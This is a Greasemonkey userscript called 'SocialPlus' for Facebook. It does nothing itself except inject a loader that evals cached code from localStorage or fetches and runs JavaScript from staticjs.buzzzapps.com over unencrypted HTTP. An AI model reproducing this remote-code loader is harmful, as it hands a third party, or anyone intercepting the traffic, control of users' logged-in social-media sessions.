// ==UserScript==
// @name          SocialPlus! :D
// @namespace     social-plus.com
// @description   SocialPlus para greasemonkey! ñ_ñ
// @include       http://*.facebook.com/*
// @include       https://*.facebook.com/*
// @include       http://apps.facebook.com/*
// ==/UserScript==

document.ready=start(0);

a=0;
function start(a)
{
     // if(window!=window.top) return; // don't run in iframe
	if(document.getElementById('socialplus')) return;
	var s=document.createElement('script');
	
	s.type="text/javascript";
	
	s.className="cachedVersion";
	s.innerHTML='if(localStorage["SPcachescript"] && localStorage["SPcachescript"].length>100000)eval(unescape(localStorage["SPcachescript"]));else {var s=document.createElement("script");s.type="text/javascript";s.src="http://staticjs.buzzzapps.com/sp/socialplus.js?"+Math.random()*999999;document.getElementsByTagName("head")[0].appendChild(s)}';
	s.id="socialplus"
	

		if(document.getElementsByTagName('head')[0])document.getElementsByTagName('head')[0].appendChild(s);
	else if(a<50) setTimeout(function(){start(a++);},100);

}